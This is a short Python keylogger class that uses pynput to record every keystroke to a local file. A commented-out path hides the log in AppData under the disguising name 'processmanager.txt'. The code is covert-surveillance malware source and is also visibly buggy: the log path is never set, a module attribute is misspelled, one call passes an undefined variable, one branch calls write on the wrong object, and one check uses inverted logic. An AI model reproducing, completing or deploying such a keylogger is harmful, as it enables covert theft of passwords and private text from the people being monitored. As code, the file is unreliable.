import os
from pynput.keyboard import Listener
import time
import threading


class Keylogger():
    keys = []
    count = 0

    #   path = os.enviroment['appdata'] + '\\processmanager.txt'
    #   path = 'processmanager.txt'

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(keys)
            self.keys = []

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    k.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()
